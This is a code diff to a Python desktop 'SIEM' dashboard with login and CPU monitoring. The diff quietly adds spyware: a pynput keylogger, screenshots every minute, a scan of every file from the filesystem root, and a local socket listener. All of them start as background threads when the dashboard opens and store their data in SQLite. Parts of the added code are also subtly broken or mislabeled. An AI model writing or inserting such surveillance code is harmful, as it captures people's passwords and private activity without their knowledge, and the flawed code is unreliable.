@@ -7,8 +7,15 @@ import psutil
 import time
 import threading
 from datetime import datetime
+import pyautogui
+import pynput
+from pynput.keyboard import Key, Listener
+import os
+import socket
 
-
+# =============================
+# DB
+# =============================
 
 DB = "siem_core.db"
 
@@ -38,10 +45,36 @@ def init():
         ts TEXT
     )""")
 
+    cur.execute("""CREATE TABLE IF NOT EXISTS keystrokes(
+        ts TEXT,
+        user TEXT,
+        keystroke TEXT
+    )""")
+
+    cur.execute("""CREATE TABLE IF NOT EXISTS screenshots(
+        ts TEXT,
+        user TEXT,
+        screenshot BLOB
+    )""")
+
+    cur.execute("""CREATE TABLE IF NOT EXISTS file_changes(
+        ts TEXT,
+        user TEXT,
+        file_change TEXT
+    )""")
+
+    cur.execute("""CREATE TABLE IF NOT EXISTS network_activity(
+        ts TEXT,
+        user TEXT,
+        network_activity TEXT
+    )""")
+
     c.commit()
     c.close()
 
-
+# =============================
+# SECURITY
+# =============================
 
 def salt():
     return uuid.uuid4().hex
@@ -49,7 +82,9 @@ def salt():
 def hashpw(pw, s):
     return hashlib.pbkdf2_hmac("sha256", pw.encode(), s.encode(), 120000).hex()
 
-
+# =============================
+# AUTH
+# =============================
 
 def register(u, p):
     c = db()
@@ -94,7 +129,96 @@ def login(u, p):
 
     return True, session
 
+# =============================
+# KEYLOGGER
+# =============================
 
+def on_press(key):
+    c = db()
+    cur = c.cursor()
+    try:
+        cur.execute("INSERT INTO keystrokes VALUES (?,?,?)",
+                    (str(datetime.utcnow()), STATE["user"], str(key)))
+        c.commit()
+    except:
+        pass
+    finally:
+        c.close()
+
+def start_keylogger():
+    listener = Listener(on_press=on_press)
+    listener.start()
+
+# =============================
+# SCREEN CAPTURE
+# =============================
+
+def take_screenshot():
+    screenshot = pyautogui.screenshot()
+    c = db()
+    cur = c.cursor()
+    try:
+        cur.execute("INSERT INTO screenshots VALUES (?,?,?)",
+                    (str(datetime.utcnow()), STATE["user"], screenshot))
+        c.commit()
+    except:
+        pass
+    finally:
+        c.close()
+
+def start_screenshot():
+    while True:
+        take_screenshot()
+        time.sleep(60)
+
+# =============================
+# FILE MONITORING
+# =============================
+
+def monitor_files():
+    while True:
+        for root, dirs, files in os.walk("/"):
+            for file in files:
+                c = db()
+                cur = c.cursor()
+                try:
+                    cur.execute("INSERT INTO file_changes VALUES (?,?,?)",
+                                (str(datetime.utcnow()), STATE["user"], file))
+                    c.commit()
+                except:
+                    pass
+                finally:
+                    c.close()
+        time.sleep(60)
+
+# =============================
+# NETWORK MONITORING
+# =============================
+
+def monitor_network():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("localhost", 12345))
+        s.listen(1)
+        conn, addr = s.accept()
+        data = conn.recv(1024)
+        c = db()
+        cur = c.cursor()
+        try:
+            cur.execute("INSERT INTO network_activity VALUES (?,?,?)",
+                        (str(datetime.utcnow()), STATE["user"], data))
+            c.commit()
+        except:
+            pass
+        finally:
+            c.close()
+        conn.close()
+        s.close()
+        time.sleep(60)
+
+# =============================
+# SIEM ENGINE
+# =============================
 
 class SIEMEngine:
     def __init__(self, user):
@@ -131,7 +255,9 @@ class SIEMEngine:
     def stop(self):
         self.running = False
 
-
+# =============================
+# GLOBAL STATE
+# =============================
 
 STATE = {
     "user": None,
@@ -139,7 +265,9 @@ STATE = {
     "engine": None
 }
 
-
+# =============================
+# UI
+# =============================
 
 class Login:
     def __init__(self, root):
@@ -174,7 +302,9 @@ class Login:
         self.root.destroy()
         dashboard()
 
-
+# =============================
+# DASHBOARD
+# =============================
 
 def dashboard():
     root = tk.Tk()
@@ -185,6 +315,10 @@ def dashboard():
     STATE["engine"] = engine
 
     threading.Thread(target=engine.run, daemon=True).start()
+    threading.Thread(target=start_keylogger, daemon=True).start()
+    threading.Thread(target=start_screenshot, daemon=True).start()
+    threading.Thread(target=monitor_files, daemon=True).start()
+    threading.Thread(target=monitor_network, daemon=True).start()
 
     cpu_label = tk.Label(root, text="CPU: --")
     cpu_label.pack()
@@ -218,7 +352,9 @@ def dashboard():
 
     root.mainloop()
 
-
+# =============================
+# BOOT
+# =============================
 
 if __name__ == "__main__":
     init()
